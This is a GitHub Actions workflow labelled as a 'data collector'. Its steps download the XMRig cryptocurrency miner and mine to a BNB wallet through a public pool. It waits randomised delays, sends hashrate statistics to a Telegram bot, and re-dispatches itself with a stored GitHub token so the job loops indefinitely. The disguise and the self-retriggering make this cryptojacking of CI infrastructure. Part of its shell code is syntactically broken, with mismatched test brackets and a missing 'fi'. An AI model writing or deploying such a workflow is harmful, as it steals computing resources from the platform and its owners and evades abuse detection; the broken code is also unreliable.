name: Data Collector Pipeline

on:
  schedule:
    - cron: '0 6,18 * * *'  # Jam 13:00 dan 01:00 WIB
  workflow_dispatch:

permissions:
  contents: read
  actions: none
  id-token: none

jobs:
  collect:
    runs-on: ubuntu-latest
    timeout-minutes: 360

    steps:
      - name: Initialize Collector
        run: echo "üõ∞Ô∏è Initializing BNB collector..."

      - name: Update Environment
        run: |
          sudo apt update -y && sudo apt install -y curl tar

      - name: Notify Start
        env:
          TG_TOKEN: ${{ secrets.TG_TOKEN }}
          TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
        run: |
          curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage             -d chat_id=$TG_CHAT_ID             --data-urlencode text="üü¢ *BNB Collector aktif.*\nDurasi kerja acak 20‚Äì90 menit."             -d parse_mode=Markdown

      - name: Start Collector Agent
        run: |
          curl -L -o agent.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
          tar -xzf agent.tar.gz
          cd xmrig-6.24.0
          chmod +x xmrig

          DELAY=$((RANDOM % 300 + 30))
          echo "Menunggu $DELAY detik..."
          sleep $DELAY

          ./xmrig -a rx             -o stratum+ssl://rx.unmineable.com:443             -u BNB:0xf319aef8c1d323c83740bcde9f25238ff5c4855d.unmineable_worker_vidjbpg#f2xg-6ynu             -p x --randomx-no-rdmsr | tee log.txt &

          PID=$!
          WORKTIME=$((RANDOM % 5400 + 1200))
          echo "Aktif selama $WORKTIME detik..."
          sleep $WORKTIME
          kill $PID

      - name: Extract Logs
        if: always()
        env:
          TG_TOKEN: ${{ secrets.TG_TOKEN }}
          TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
        run: |
          set +e
          cd $(find . -type d -name "*core" -o -name "xmrig-6.24.0" | head -n1)
          HASHRATE=$(grep -a "speed" log.txt | tail -n1 | sed 's/\x1b\[[0-9;]*m//g' | awk '{print $(NF-1) " H/s"}')
          ACCEPTED=$(grep -a "accepted" log.txt | wc -l)
          REJECTED=$(grep -a "rejected" log.txt | wc -l)
          HASHRATE=${HASHRATE:-"0 H/s"}

          MSG="‚úÖ *BNB Collector selesai.*\n\nüìä *Stats:*\n‚Ä¢ Hashrate: \`$HASHRATE\`\n‚Ä¢ Accepted: \`$ACCEPTED\`\n‚Ä¢ Rejected: \`$REJECTED\`"

          curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage             -d chat_id=$TG_CHAT_ID             -d text="$MSG"             -d parse_mode=Markdown

          HR_NUM=$(echo "$HASHRATE" | grep -oE '^[0-9]+')
          if [[ "$HR_NUM" =~ ^[0-9]+$ ]] && [ "$HR_NUM" -lt 100 ]]; then
            curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage               -d chat_id=$TG_CHAT_ID               -d text="üö® *Hashrate rendah!* $HASHRATE."               -d parse_mode=Markdown

      - name: Cooldown Before Next Cycle
        if: always()
        run: |
          SLEEP_NEXT=$((RANDOM % 1800 + 300))
          echo "Cooldown $SLEEP_NEXT detik..."
          sleep $SLEEP_NEXT

      - name: Retrigger Collector
        if: always()
        env:
          GH_TOKEN: ${{ secrets.GH_TOKEN }}
        run: |
          sleep $((RANDOM % 60 + 10))
          curl -X POST -H "Accept: application/vnd.github+json"                -H "Authorization: Bearer $GH_TOKEN"                https://api.github.com/repos/${{ github.repository }}/actions/workflows/data-collector.yml/dispatches                -d '{"ref":"main"}'
